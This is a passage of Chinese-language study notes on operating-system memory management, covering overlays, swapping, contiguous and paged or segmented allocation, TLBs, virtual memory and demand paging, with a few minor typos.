<p>覆盖与交换技术是在多道程序环境下 <strong>用来扩充内存</strong> 的两种方法。</p>
<ul>
<li>
<p><strong>覆盖</strong></p>
<p>早期的计算机系统中，主存容量很小，虽然主存中仅存放一道用户程序，但存储空间放不下用户进程的现象也经常发生，这一矛盾可以用覆盖技术来解决。</p>
<p><strong>覆盖的基本思想</strong>：由于程序运行时并非任何时候都要访问程序及数据的各个部分（尤其是大程序），因此可把用户空间分成一个固定区和若干覆盖区。将经常活跃的部分放在固定区，其余部分按调用关系分段。首先将那些即将要访问的段放入覆盖区，其他段放在外存中，在需要调用前，系统再将其调入覆盖区，替换覆盖区中原有的段。</p>
<p><strong>覆盖技术的特点</strong>：打破了必须将一个进程的全部信息装入主存后才能运行的限制，但当同时运行程序的代码量大于主存时仍不能运行，此外，内存中能够更新的地方只有覆盖区的段，不在覆盖区中的段会常驻内存。覆盖技术对用户和程序员不透明。</p>
</li>
<li>
<p><strong>交换</strong></p>
<p><strong>交换（对换）的基本思想</strong>：把处于等待状态（或在 CPU 调度原则下被剥夺运行权利）的程序从内存移到辅存，把内存空间腾出来，这一过程又称换出；把准备好竞争 CPU 运行的程序从辅存移到内存，这一过程又称换入。</p>
<p>例如，有一个 CPU 采用时间片轮转调度算法的多道程序环境。时间片到，内存管理器将刚刚执行过的进程换出，将另一进程换入刚刚释放的内存空间。同时，CPU 调度器可以将时间片分配给其他已在内存中的进程。每个进程用完时间片都与另一进程交换。在理想情况下，内存管理器的交换过程速度足够快，总有进程在内存中可以执行。</p>
<p><strong>需要注意以下几个问题：</strong></p>
<ul>
<li>交换需要备份存储，通常是磁盘。它必须足够大，并提供对这些内存映像的直接访问</li>
<li>为了有效使用 CPU，需要使每个进程的执行时间比交换时间长</li>
<li>若换出进程，则必须确保该进程完全处于空闲状态</li>
<li>交换空间通常作为磁盘的一整块，且独立于文件系统，因此使用起来可能很快</li>
<li>交换通常在有许多进程运行且内存空间吃紧时开始启动，而在系统负荷降低时就暂停</li>
<li>普通的交换使用不多，但交换策略的某些变体在许多系统（如：UNIX）中仍发挥作用</li>
</ul>
</li>
</ul>
<p>交换技术主要在不同进程（或作业）之间进行，而覆盖则用于同一个程序或进程中。对于主存无法存放用户程序的矛盾，现代操作系统是通过虚拟内存技术来解决的，覆盖技术则已成为历史；而交换技术在现代操作系统中仍具有较强的生命力。</p>
<h4> 连续分配管理方式</h4>
<p>连续分配方式是指为一个用户程序分配一个连续的内存空间，如：某用户需要 <code>100MB</code> 的内存空间，连续分配方式就在内存空间中为用户分配一块连续的 <code>100MB</code> 空间。<strong>连续分配方式主要包括</strong>：单一连续分配、固定分区分配和动态分区分配。</p>
<ol>
<li>
<p><strong>单一连续分配</strong></p>
<p>内存在此方式下分为系统区和用户区，系统区仅供操作系统使用，通常在低地址部分；在用户区内存中，仅有一道用户程序，即整个内存的用户空间由该程序独占。</p>
<p><strong>优点</strong>：简单、无外部碎片，无须进行内存保护，因为内存中永远只有一道程序。</p>
<p><strong>缺点</strong>：只能用于单用户、单任务的操作系统中，有内部碎片，存储器的利用率极低。</p>
</li>
<li>
<p><strong>固定分区分配</strong></p>
<p>固定分区分配是最简单的一种多道程序存储管理方式，它将用户内存空间划分为若干固定大小的区域，每个分区只装入一道作业。当有空闲分区时，便可再从外存的后备作业队列中选择适当大小的作业装入该分区，如此循环。<strong>在划分分区时有两种不同的方法：</strong></p>
<ul>
<li><strong>分区大小相等</strong>：程序太小会造成浪费，程序太大又无法装入，缺乏灵活性</li>
<li><strong>分区大小不等</strong>：划分为多个较小的分区、适量的中等分区和少量大分区</li>
</ul>
<p>为了便于分配，建立一张分区使用表，通常按分区大小排队，各表项包括每个分区的起始地址、大小及状态（是否已分配）。分配内存时，便检索该表，以找到一个能满足要求且尚未分配的分区分配给装入程序，并将对应表项的状态置为 “已分配”；若找不到这样的分区，则拒绝分配。回收内存时，只需将对应表项的状态置为 “未分配” 即可。</p>
<p><strong>这种方式存在两个问题：</strong></p>
<ul>
<li>程序可能太大而放不进任何一个分区，这时就需要采用覆盖技术来使用内存空间</li>
<li>当程序小于固定分区大小时，也要占用一个完整的内存分区，这样分区内部就存在空间浪费，这种现象称为内部碎片。固定分区是可用于多道程序设计的最简单的存储分配，无外部碎片，但不能实现多进程共享一个主存区，所以存储空间利用率低</li>
</ul>
</li>
<li>
<p><strong>动态分区分配</strong></p>
<p>又称可变分区分配，它是在进程装入内存时，根据进程的实际需要，动态地为之分配内存，并使分区的大小正好适合进程的需要。因此，系统中分区的大小和数目是可变的。</p>
<p>例如：系统有 <code>64MB</code> 内存空间，其中低 <code>8MB</code> 固定分配给操作系统，其余 <code>56MB</code> 为用户可用内存。有四个进程：进程1（20MB）、进程2（14MB）、进程3（18MB）、进程4（8MB），开始时装入前三个进程，它们分别分配到所需的空间后，内存仅剩 <code>4MB</code>，进程4（8MB） 无法装入。在某个时刻，内存中没有一个就绪进程，CPU 出现空闲，操作系统就换出进程2（14MB），换入进程4（8MB）。由于进程4 比进程2 小，这样在主存中就产生了一个 <code>6MB</code> 的内存块。之后 CPU 又出现空闲，需要换入进程2（14MB），而主存无法容纳进程2（14MB），操作系统就换出进程1（20MB），换入进程2（14MB）。</p>
<figure><figcaption>动态分区分配</figcaption></figure>
<p>动态分区在开始时是很好的，但随着时间的推移，内存中会产生越来越多小的内存块，内存的利用率也随之下降。这些小的内存块称为外部碎片，它存在于所有分区的外部，这与固定分区中的内部碎片正好相对。克服外部碎片可以通过紧凑技术来解决，即操作系统不时地对进程进行移动和整理。但这需要动态重定位寄存器的支持，且相对费时。紧凑的过程实际上类似于 Windows 系统中的磁盘碎片整理程序，只不过后者是对外存空间的紧。</p>
<p>在进程装入或换入主存时，若内存中有多个足够大的空闲块，则操作系统必须确定分配哪个内存块给进程使用，这就是动态分区的分配策略。<strong>考虑以下几种算法：</strong></p>
<ul>
<li><strong>首次适应（First Fit）算法</strong>：空闲分区以地址递增的次序链接。分配内存时，从链首开始顺序查找，找到大小能满足要求的第一个空闲分区分配给作业</li>
<li><strong>邻近适应（Next Fit）算法</strong>：又称循环首次适应算法，由首次适应算法演变而成。不同之处是，分配内存时从上次查找结束的位置开始继续查找</li>
<li><strong>最佳适应（Best Fit）算法</strong>：空闲分区按容量递增的次序形成空闲分区链，找到第一个能满足要求且最小的空闲分区分配给作业，避免 “大材小用”</li>
<li><strong>最坏适应（Worst Fit）算法</strong>：空闲分区以容量递减的次序链接，找到第一个能满足要求的，即最大的分区，从中分割一部分存储空间给作业</li>
</ul>
<p>首次适应算法最简单，通常也是最好和最快的。不过，首次适应算法会使得内存的低地址部分出现很多小的空闲分区，而每次分配查找时都要经过这些分区，因此增加了开销。</p>
<p>邻近适应算法试图解决这个问题。但它常常导致在内存空间的尾部（因为在一遍扫描中，内存前面部分使用后再释放时，不会参与分配）分裂成小碎片。通常比首次适应算法要差。</p>
<p>最佳适应算法虽然称为 “最佳”，但是性能通常很差，因为每次最佳的分配会留下很小的难以利用的内存块，会产生最多的外部碎片。</p>
<p>最坏适应算法与最佳适应算法相反，它选择最大的可用块，这看起来最不容易产生碎片，但是却把最大的连续内存划分开，会很快导致没有可用的大内存块，因此性能也非常差。</p>
<p>在动态分区分配中，与固定分区分配类似，设置一张空闲分区链（表），并按始址排序。分配内存时，检索空闲分区链，找到所需的分区，若其大小大于请求大小，便从该分区中按请求大小分割一块空间分配给装入进程（若剩余部分小到不足以划分，则无须分割），余下部分仍留在空闲分区链中。回收内存时，系统根据回收分区的始址，从空闲分区链中找到相应的插入点，此时可能出现四种情况：</p>
<ul>
<li>回收区与插入点的前一空闲分区相邻，将这两个分区合并，并修改前一分区表项的大小为两者之和</li>
<li>回收区与插入点的后一空闲分区相邻，将这两个分区合并，并修改后一分区表项的始址和大小</li>
<li>回收区同时与插入点的前人后两个分区相邻，此时将这三个分区合并，修改前一分区表项的大小为三者之和，取消后一分区表项</li>
<li>回收区没有相邻的空闲分区，此时应为回收区新建一个表项，填写始址和大小，并插入空闲分区链。</li>
</ul>
</li>
</ol>
<p>以上 <strong>三种内存分区管理方法有一个共同特点</strong>，即用户程序在主存中都是连续存放的。</p>
<p>在连续分配方式中，即使内存有超过 <code>1GB</code> 的空闲空间，但若没有连续的 <code>1GB</code> 空间，则需要 <code>1GB</code> 空间的作业仍然是无法运行的；但若采用非连续分配方式，则作业所要求的 <code>1GB</code> 内存空间可以分散地分配在内存的各个区域，当然，这也需要额外的空间去存储它们（分散区域）的索引，使得非连续分配方式的存储密度低于连续分配方式。非连续分配方式根据分区的大小是否固定，分为分页存储管理和分段存储管理。在分页存储管理中，又根据运行作业时是否要把作业的所有页面都装入内存才能运行，分为基本分页存储管理和请求分页存储管理。</p>
<h4> 基本分页存储管理</h4>
<p>固定分区会产生内部碎片，动态分区会产生外部碎片，这两种技术对内存的利用率都比较低。希望内存的使用能尽量避免碎片的产生，这就引入了 <strong>分页</strong> 的思想：把主存空间划分为大小相等且固定的块，块相对较小，作为主存的基本单位。每个进程也以块为单位进行划分，进程在执行时，以块为单位逐个申请主存中的块空间。</p>
<p>分页的方法从形式上看，像分区相等的固定分区技术，分页管理不会产生外部碎片。但它又有本质的不同点：块的大小相对分区要小很多，而且进程也按照块进行划分，进程运行时按块申请主存可用空间并执行。这样，进程只会在为最后一个不完整的块申请一个主存块空间时，才产生主存碎片，所以尽管会产生内部碎片，但这种碎片相对于进程来说也是很小的，每个进程平均只产生半个块大小的内部碎片（也称页内碎片）。</p>
<ol>
<li>
<p><strong>分页存储基本概念</strong></p>
<ul>
<li>
<p><strong>页面和页面大小</strong></p>
<p>进程中的块称为页或页面（Page），内存中的块称为页框或页帧（Page Frame）。外存也以同样的单位进行划分，直接称为块或盘块（Block）。进程在执行时需要申请主存空间，即要为每个页面分配主存中的可用页框，这就产生了页和页框的一一对应。</p>
<p>为方便地址转换，页面大小应是 <code>2</code> 的整数幂。同时页面大小应该适中，页面太小会使进程的页面数过多，这样页表就会过长，占用大量内存，而且也会增加硬件地址转换的开销，降低页面换入/换出的效率；页面过大又会使页内碎片增多，降低内存的利用率。</p>
</li>
<li>
<p><strong>地址结构</strong></p>
<p>地址结构包含两部分：前一部分为 <strong>页号 P</strong>，后一部分为 <strong>页内偏移量 W</strong>。地址长度为 <code>32</code> 位，其中 <code>0~11</code> 位为页内偏移量地址，即每页大小为 <code>4KB</code>；<code>12~31</code> 位为页号，即最多允许 2<sup>20</sup> 页。</p>
<p>地址结构决定了虚拟内存的寻址空间有多大。</p>
</li>
<li>
<p><strong>页表</strong></p>
<p>为了便于在内存中找到进程的每个页面所对应的物理块，系统为每个进程建立一张页表，它记录页面在内存中对应的物理块号，页表一般存放在内存中。</p>
<p>在配置页表后，进程执行时，通过查找该表，即可找到每页在内存中的物理块号。可见，<strong>页表的作用是实现从页号到物理块号的地址映射。</strong></p>
<p>页表是由页表项组成的，页表项与地址都由两部分构成，而且第一部分都是页号，但页表项的第二部分是物理内存中的块号，而地址的第二部分是页内偏同组成物理地址。</p>
</li>
</ul>
</li>
<li>
<p><strong>基本地址变换机构</strong></p>
<p>地址变换机构的任务是 <strong>将逻辑地址转换为内存中的物理地址</strong>。地址变换是借助于页表实现的。下图给出了分页存储管理系统中的地址变换机构。</p>
<figure><figcaption>分页存储管理系统中的地址变换机构</figcaption></figure>
<p>在系统中通常设置一个 <strong>页表寄存器（PTR）</strong>，存放页表在内存的起始地址 <code>F</code> 和页表长度 <code>M</code>。平时，进程未执行时，页表的始址和页表长度存放在本进程的 <code>PCB</code> 中，当进程被调度执行时，才将页表始址和页表长度装入页表寄存器中。设页面大小为 <code>L</code>，逻辑地址 <code>A</code> 到物理地址 <code>E</code> 的变换过程如下（假设逻辑地址、页号、每页的长度都是十进制数）：</p>
<ul>
<li>计算页号 <code>P（P=A/L）</code>和页内偏移量 <code>W（W=A%L）</code></li>
<li>比较页号 <code>P</code> 和页表长度 <code>M</code>，若 <code>P ≥ M</code>，则产生越界中断，否则继续执行</li>
<li>页表中页号 <code>P</code> 对应的页表项地址 = 页表始址 F + 页号 P x 页表项长度，取出该页表项内容 <code>b</code>，即为物理块号。注意区分页表长度和页表项长度。页表长度是指一共有多少页，页表项长度是指页地址占多大的存储空间</li>
<li>计算 <code>E = b x L + W</code>，用得到的物理地址 <code>E</code> 去访间内存</li>
</ul>
<p>以上整个地址变换过程均是由硬件自动完成的。例如：若页面大小 <code>L</code> 为 <code>1KB</code>，页号 <code>2</code> 对应的物理块为 <code>b = 8</code>，计算逻辑地址 <code>A = 2500</code> 的物理地址 <code>E</code> 的过程如下：<code>P = 2500 / 1K = 2</code>，<code>W = 2500 % 1K = 452</code>，查找得到页号 <code>2</code> 对应的物理块的块号为 <code>8</code>，<code>E = 8 x 1024 + 452 = 8644</code>。</p>
<p><strong>分页管理方式存在的两个主要问题：</strong></p>
<ul>
<li>每次访存操作都需要进行逻辑地址到物理地址的转换，地址转换过程必须足够快，否则访存速度会降低</li>
<li>每个进程引入页表，用于存储映射机制，页表不能太大，否则内存利用率会降低</li>
</ul>
</li>
<li>
<p><strong>具有快表的地址变换机构</strong></p>
<p>由上面介绍的地址变换过程可知，若页表全部放在内存中，则存取一个数据或一条指令至少要访问两次内存：第一次是访问页表，确定所存取的数据或指令的物理地址；第二次是根据该地址存取数据或指令。显然，这种方法比通常执行指令的速度慢了一半。</p>
<p>为此，在地址变换机构中增设一个具有并行查找能力的高速缓冲存储器——快表，又称相联存储器（TLB），用来存放当前访问的若干页表项，以加速地址变换的过程。与此对应，主存中的页表常称为慢表。具有快表的地址变换机构如图下所示。</p>
<figure><figcaption>具有快表的地址变换机构</figcaption></figure>
<p>在具有快表的分页机制中，<strong>地址的变换过程如下：</strong></p>
<ul>
<li>CPU 给出逻辑地址后，由硬件进行地址转换，将页号送入高速缓存寄存器，并将此页号与快表中的所有页号进行比较</li>
<li>若找到匹配的页号，说明所要访问的页表项在快表中，则直接从中取出该页对应的页框号，与页内偏移量拼接形成物理地址。这样，存取数据仅一次访存便可实现</li>
<li>若未找到匹配的页号，则需要访问主存中的页表，读出页表项后情应同时将其存入快表，以便后面可能的再次访问。若快表已满，则须按特定的算法淘汰一个旧页表项</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>有些处理机设计为快表和慢表同时查找，若在快表中查找成功则终止慢表的查找</p>
</div>
</li>
<li>
<p><strong>两级页表</strong></p>
<p>二级页表就是构造一个页表的页表。为查询方便，顶级页表最多只能有 <code>1</code> 个页面（一定要记住这个规定），因此顶级页表总共可以容纳 <code>4KB / 4B = 1K</code> 个页表项，它占用的地址位数为 log<sub>2</sub>1K = 10 位，页内偏移地址占用了 <code>12</code> 位，因此一个 <code>32</code> 位的逻辑地址空间就剩下了 <code>10</code> 位，正好使得二级页表的大小在一页之内，这样就得到了逻辑地址空间的格式。</p>
<p>二级页表实际上是在原有页表结构上再加上一层页表。建立多级页表的目的在于建立索引，以便不用浪费主存空间去存储无用的页表项，也不用盲目地顺序式查找页表项。</p>
</li>
</ol>
<h4> 基本分段存储管理</h4>
<p>分页管理方式是从计算机的角度考虑设计的，目的是提高内存的利用率，提升计算机的性能。分页通过硬件机制实现，对用户完全透明。分段管理方式的提出则考虑了用户和程序员，以满足方便编程、信息保护和共享、动态增长及动态链接等多方面的需要。</p>
<ol>
<li>
<p><strong>分段</strong></p>
<p>段式管理方式按照用户进程中的自然段划分逻辑空间。例如：用户进程由主程序段、两个子程序段、栈段和数据段组成，于是可以把这个用户进程划分为 <code>5</code> 段，每段从 <code>0</code> 开始编址，并分配一段连续的地址空间（段内要求连续，段间不要求连续，因此整个作业的地址空间是二维的），其逻辑地址由段号 <code>S</code> 与段内偏移量 <code>W</code> 两部分组成。</p>
<p>段号为 <code>16</code> 位，段内偏移量为 <code>16</code> 位，因此一个作业最多有 2<sup>16</sup> = 65536 段，最大段长为 <code>64KB</code>。</p>
<p>在页式系统中，逻辑地址的页号和页内偏移量对用户是透明的，但在段式系统中，段号和段内偏移量必须由用户显式提供，在高级程序设计语言中，这个工作由编译程序完成。</p>
</li>
<li>
<p><strong>段表</strong></p>
<p>每个进程都有一张逻辑空间与内存空间映射的段表，其中每个段表项对应进程的一段，段表项记录该段在内存中的始址和长度。<strong>段表的内容</strong>：段号、段长和本段在主存的始址。</p>
<p>配置段表后，执行中的进程可通过查找段表，找到每段所对应的内存区。可见，<strong>段表用于实现从逻辑段到物理内存区的映射。</strong></p>
</li>
<li>
<p><strong>地址变换机构</strong></p>
<p>为了实现进程从逻辑地址到物理地址的变换功能，在系统中设置了段表寄存器，用于存放段表始址 <code>F</code> 和段表长度 <code>M</code>。从逻辑地址 <code>A</code> 到物理地址 <code>E</code> 之间的地址变换过程如下：</p>
<ul>
<li>从逻辑地址 <code>A</code> 中取出前几位为段号 <code>S</code>，后几位为段内偏移量 <code>W</code>。注意，在地址变换的题目中，要注意逻辑地址是用二进制数还是用十进制数给出的</li>
<li>比较段号 <code>S</code> 和段表长度 <code>M</code>，若 <code>S ≥ M</code>，则产生越界中断，否则继续执行</li>
<li>段表中段号 <code>S</code> 对应的段表项地址 = 段表始址 <code>F</code> + 段号 <code>S</code> x 段表项长度，取出该段表项的前几位得到段长 <code>C</code>。若段内偏移量 ≥ C，则产生越界中断，否则继续执行。从这句话可以看出，段表项实际上只有两部分，前几位是段长，后几位是始址</li>
<li>取出段表项中该段的始址 <code>b</code>，计算 <code>E = b + W</code>，用得到的物理地址 <code>E</code> 去访问内存</li>
</ul>
</li>
<li>
<p><strong>段的共享与保护</strong></p>
<p>在分段系统中，<strong>段的共享</strong> 是通过两个作业的段表中相应表项指向被共享的段的同一个物理副本来实现的。当一个作业正从共享段中读取数据时，必须防止另一个作业修改此共享段中的数据。不能修改的代码称为纯代码或可重入代码（它不属于临界资源），这样的代码和不能修改的数据可以共享，而可修改的代码和数据不能共享。</p>
<p>与分页管理类似，<strong>分段管理的保护方法主要有两种</strong>：一种是存取控制保护，另一种是地址越界保护。地址越界保护将段表寄存器中的段表长度与逻辑地址中的段号比较，若段号大于段表长度，则产生越界中断；再将段表项中的段长和逻辑地址中的段内偏移进行比较，若段内偏移大于段长，也会产生越界中断。分页管理只需要判断页号是否越界，页内偏移是不可能越界的。</p>
<p>与页式管理不同，段式管理不能通过给出一个整数便确定对应的物理地址，因为每段的长度是不固定的，无法通过整数除法得出段号，无法通过求余得出段内偏移，所以段号和段内偏移一定要显式给出，因此分段管理的地址空间是二维的。</p>
</li>
</ol>
<h4> 段页式管理</h4>
<p>分页存储管理能有效地提高内存利用率，而分段存储管理能反映程序的逻辑结构并有利于段的共享和保护。将这两种存储管理方法结合起来，便形成了段页式存储管理方式。</p>
<p>在段页式系统中，作业的地址空间首先被分成若干逻辑段，每段都有自已的段号，然后将每段分成若干大小固定的页。对内存空间的管理仍然和分页存储管理一样，将其分成若干和页面大小相同的存储块，对内存的分配以存储块为单位。</p>
<p>在段页式系统中，<strong>作业的逻辑地址分为三部分</strong>：段号 S、页号 P 和页内偏移量 W。</p>
<p>为了实现地址变换，系统为每个进程建立一张段表，每个分段有一张页表。段表表项中至少包括段号、页表长度和页表始址，页表表项中至少包括页号和块号。此外，系统中还应有一个段表寄存器，指出作业的段表始址和段表长度（段表寄存器和页表寄存器的作用都有两个，一是在段表或页表中寻址，二是判断是否越界）。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>在一个进程中，段表只有一个，而页表可能有多个</p>
</div>
<p>在进行地址变换时，首先通过段表查到页表始址，然后通过页表找到页帧号，最后形成物理地址。进行一次访问实际需要三次访问主存，这里同样可以使用快表来加快查找速度，其关键字由段号、页号组成，值是对应的页帧号和保护码。</p>
<p>结合上面对段式和页式管理地址空间的分析，得出结论：<strong>段页式管理的地址空间是二维的。</strong></p>
<h3> 虚拟内存管理</h3>
<h4> 虚拟内存的基本概念</h4>
<ol>
<li>
<p><strong>传统存储管理方式的特征</strong></p>
<p>各种内存管理策略都是为了同时将多个进程保存在内存中，以便允许进行多道程序设计。它们都 <strong>具有以下两个共同的特征：</strong></p>
<ul>
<li><strong>一次性</strong>：作业必须一次性全部装入内存后，才能开始运行。这会导致两种情况：第一种当作业很大而不能全部被装入内存时，将使该作业无法运行；第二种当大量作业要求运行时，由于内存不足以容纳所有作业，只能使少数作业先运行，导致多道程序度的下降</li>
<li><strong>驻留性</strong>：作业被装入内存后，就一直驻留在内存中，其任何部分都不会被换出，直至作业运行结束。运行中的进程会因等待 <code>I/O</code> 而被阻塞，可能处于长期等待状态</li>
</ul>
<p>因此，许多在程序运行中不用或暂时不用的程序（数据）占据了大量的内存空间，而一些需要运行的作业又无法装入运行，显然浪费了宝贵的内存资源。</p>
</li>
<li>
<p><strong>局部性原理</strong></p>
<p>要真正理解虚拟内存技术的思想，首先须了解著名的局部性原理。从广义上讲，快表、页高速缓存及虚拟内存技术都属于高速缓存技术，这个技术所依赖的原理就是局部性原理。局部性原理既适用于程序结构，又适用于数据结构（更远地讲，Dijkstra 关于 “goto 语句有害” 的著名论文也出于对程序局部性原理的深刻认识和理解）。</p>
<p><strong>局部性原理表现在以下两个方面：</strong></p>
<ul>
<li><strong>时间局部性</strong>：程序中的某条指令一旦执行，不久后该指令可能再次执行；某数据被访问过，不久后该数据可能再次被访问。产生的原因是程序中存在着大量的循环操作</li>
<li><strong>空间局部性</strong>：一旦程序访问了某个存储单元，在不久后，其附近的存储单元也将被访问，即程序在一段时间内所访问的地址，可能集中在一定的范围之内，因为指令通常是顺序存放、顺序执行的，数据也一般是以向量、数组、表等形式簇聚存储的</li>
</ul>
<p>时间局部性通过将近来使用的指令和数据保存到高速缓存中，并使用高速缓存的层次结构实现。空间局部性通常使用较大的高速缓存，并将预取机制集成到高速缓存控制逻辑中实现。虚拟内存技术实际上建立了 “内存-外存” 的两级存储器结构，利用局部性原理实现高速缓存。</p>
</li>
<li>
<p><strong>虚拟存储器的定义和特征</strong></p>
<p>基于局部性原理，在程序装入时，仅须将程序当前要运行的少数页面或段先装入内存，而将其余部分暂留在外存，便可启动程序执行。在程序执行过程中，当所访问的信息不在内存时，由操作系统将所需要的部分调入内存，然后继续执行程序。另一方面，操作系统将内存中暂时不使用的内容换出到外存上，从而腾出空间存放将要调入内存的信息。这样，系统好像为用户提供了一个比实际内存容量大得多的存储器，称为虚拟存储器。</p>
<p>之所以将其称为虚拟存储器，是因为这种存储器实际上并不存在，只是由于系统提供了部分装入、请求调入和置换功能后（对用户透明），给用户的感觉是好像存在一个比实际物理内存大得多的存储器。但容量大只是一种错觉，是虚的。<strong>虚拟存储器有以下三个主要特征：</strong></p>
<ul>
<li><strong>多次性</strong>：是指无须在作业运行时一次性地全部装入内存，而允许被分成多次调入内存运行，即只需将当前要运行的那部分程序和数据装入内存即可开始运行。以后每当要运行到尚未调入的那部分程序时，再将它调入</li>
<li><strong>对换性</strong>：是指无须在作业运行时一直常驻内存，在进程运行期间，允许将那些暂不使用的程序和数据从内存调至外存的对换区（换出），待以后需要时再将它们从外存调至内存（换进）。正是由于对换性，才使得虚拟存储器得以正常运行</li>
<li><strong>虚拟性</strong>：是指从逻辑上扩充内存的容量，使用户所看到的内存容量远大于实际的内存容量</li>
</ul>
</li>
<li>
<p><strong>虚拟内存技术的实现</strong></p>
<p>虚拟内存技术允许将一个作业分多次调入内存。采用连续分配方式时，会使相当一部分内存空间都处于暂时或 “永久” 的空闲状态，造成内存资源的严重浪费，而且也无法从逻辑上扩大内存容量。因此，虚拟内存的实现需要建立在离散分配的内存管理方式的基础上。</p>
<p><strong>虚拟内存的实现有以下三种方式：</strong></p>
<ul>
<li>请求分页存储管理</li>
<li>请求分段存储管理</li>
<li>请求段页式存储管理</li>
</ul>
<p>不管哪种方式，都需要有一定的硬件支持。<strong>一般需要的硬件支持</strong> 有以下几个方面：</p>
<ul>
<li>一定容量的内存和外存</li>
<li>页表机制（或段表机制），作为主要的数据结构</li>
<li>中断机构，当用户程序要访问的部分尚未调入内存时，则产生中断</li>
<li>地址变换机构，逻辑地址到物理地址的变换</li>
</ul>
</li>
</ol>
<h4> 请求分页管理方式</h4>
<p>请求分页系统建立在基本分页系统基础之上，为了支持虚拟存储器功能而 <strong>增加了请求调页功能和页面置换功能</strong>。请求分页是目前最常用的一种实现虚拟存储器的方法。</p>
<p>在请求分页系统中，只要求将当前需要的一部分页面装入内存，便可以启动作业运行。在作业执行过程中，当所要访问的页面不在内存中时，再通过调页功能将其调入，同时还可通过置换功能将暂时不用的页面换出到外存上，以便腾出内存空间。</p>
<p>为了实现请求分页，系统必须提供一定的硬件支持。除了需要一定容量的内存及外存的计算机系统，还需要有页表机制、缺页中断机构和地址变换机构。</p>
<ol>
<li>
<p><strong>页表机制</strong></p>
<p>请求分页系统的页表机制不同于基本分页系统，请求分页系统在一个作业运行之前不要求全部一次性调入内存，因此在作业的运行过程中，必然会出现要访问的页面不在内存中的情况，如何发现和处理这种情况是请求分页系统必须解决的两个基本问题。为此，<strong>在请求页表项中增加了四个字段：</strong></p>
<ul>
<li><strong>状态位 P</strong>：用于指示该页是否已调入内存，供程序访问时参考</li>
<li><strong>访问字段 A</strong>：用于记录本页在一段时间内被访问的次数，或记录本页最近已有多长时间未被访问，供置换算法换出页面时参考</li>
<li><strong>修改位 M</strong>：标识该页在调入内存后是否被修改过，以确定页面置换时是否写回外存</li>
<li><strong>外存地址</strong>：用于指出该页在外存上的地址，通常是物理块号，供调入该页时参考</li>
</ul>
</li>
<li>
<p><strong>缺页中断机构</strong></p>
<p>在请求分页系统中，每当所要访问的页面不在内存中时，便产生一个缺页中断，请求操作系统将所缺的页调入内存。此时应将缺页的进程阻塞（调页完成唤醒），若内存中有空闲块，则分配一个块，将要调入的页装入该块，并修改页表中的相应页表项，若此时内存中没有空闲块，则要淘汰某页（若被淘汰页在内存期间被修改过，则要将其写回外存）。</p>
<p>缺页中断作为中断，同样要经历诸如：保护 CPU 环境、分析中断原因、转入缺页中断处理程序、恢复 CPU 环境等几个步骤。但与一般的中断相比，它 <strong>有以下两个明显的区别：</strong></p>
<ul>
<li>在指令执行期间而非一条指令执行完后产生和处理中断信号，属于内部异常</li>
<li>一条指令在执行期间，可能产生多次缺页中断</li>
</ul>
</li>
<li>
<p><strong>地址变换机构</strong></p>
<p>请求分页系统中的地址变换机构，是在分页系统地址变换机构的基础上，为实现虚拟内存，又增加了某些功能而形成的，如：产生和处理缺页中断，及从内存中换出一页的功能等等。</p>
<p>如下图所示，在进行地址变换时，先检索快表：</p>
<ul>
<li>若找到要访问的页，则修改页表项中的访问位（写指令还需要重置修改位），然后利用页表项中给出的物理块号和页内地址形成物理地址</li>
<li>若未找到该页的页表项，则应到内存中去查找页表，再对比页表项中的状态位 P，看该页是否已调入内存，若页面已调入，则将该页的页表写入快表，若快表已满，则需采用某种算法替换。若页面未调入，则产生缺页中断，请求从外存把该页调入内存</li>
</ul>
</li>
</ol>
<h4> 页框分配</h4>
<ol>
<li>
<p><strong>驻留集大小</strong></p>
<p>对于分页式的虚拟内存，在进程准备执行时，不需要也不可能把一个进程的所有页都读入主存。因此，操作系统必须决定读取多少页，即决定给特定的进程分配几个页框。<strong>给一个进程分配的物理页框的集合就是这个进程的驻留集。需要考虑以下几点：</strong></p>
<ul>
<li>分配给一个进程的页框越少，驻留在主存中的进程就越多，从而可提高 CPU 的利用率</li>
<li>若一个进程在主存中的页面过少，则尽管有局部性原理，缺页率仍相对较高</li>
<li>若分配的页框过多，则由于局部性原理，对该进程的缺页率没有太明显的影响</li>
</ul>
</li>
<li>
<p><strong>内存分配策略</strong></p>
<p>在 <strong>请求分页系统中，可采取两种内存分配策略</strong>，即固定和可变分配策略。在 <strong>进行置换时，也可采取两种策略</strong>，即全局置换和局部置换。于是可 <strong>组合出下面三种适用的策略：</strong></p>
<ul>
<li>
<p><strong>固定分配局部置换</strong></p>
<p>为每个进程分配一定数目的物理块，在进程运行期间都不改变。所谓局部置换，是指如果进程在运行中发生缺页，则只能从分配给该进程在内存的页面中选出一页换出，然后再调入一页，以保证分配给该进程的内存空间不变。实现这种策略时，难以确定应为每个进程分配的物理块数目，太少会频繁出现缺页中断，太多又会降低 CPU 和其他资源的利用率。</p>
</li>
<li>
<p><strong>可变分配全局置换</strong></p>
<p>先为每个进程分配一定数目的物理块，在进程运行期间可根据情况适当地增加或减少。所谓全局置换，是指如果进程在运行中发生缺页，系统从空闲物理块队列中取出一块分配给该进程，并将所缺页调入。这种方法比固定分配局部置换更加灵活，可以动态增加进程的物理块，但也存在弊端，如它会盲目地给进程增加物理块，从而导致系统多道程序的并发能力下降。</p>
</li>
<li>
<p><strong>可变分配局部置换</strong></p>
<p>为每个进程分配一定数目的物理块，当某进程发生缺页时，只允许从该进程在内存的页面中选出一页换出，因此不会影响其他进程的运行。若进程在运行中频繁地发生缺页中断，则系统再为该进程分配若干物理块，直至该进程的缺页率趋于适当程度；反之，若进程在运行中的缺页率特别低，则可适当减少分配给该进程的物理块，但不能引起其缺页率的明显增加。这种方法在保证进程不会过多地调页的同时，也保持了系统的多道程序并发能力。当然它需要更复杂的实现，也需要更大的开销，w换入/换出所浪费的计算机资源，这种牺性是值得的。</p>
</li>
</ul>
</li>
<li>
<p><strong>物理块调入算法</strong></p>
<p>采用固定分配策略时，将系统中的空闲物理块分配给各个进程，可采用下述几种算法：</p>
<ul>
<li><strong>平均分配算法</strong>：将系统中所有可供分配的物理块平均分配给各个进程</li>
<li><strong>按比例分配算法</strong>：根据进程的大小按比例分配物理块</li>
<li><strong>优先权分配算法</strong>：为重要和紧迫的进程分配较多的物理块。通常采取的方法是把所有可分配的物理块分成两部分：一部分按比例分配给各个进程；一部分则根据优先权分配</li>
</ul>
</li>
<li>
<p><strong>调入页面的时机</strong></p>
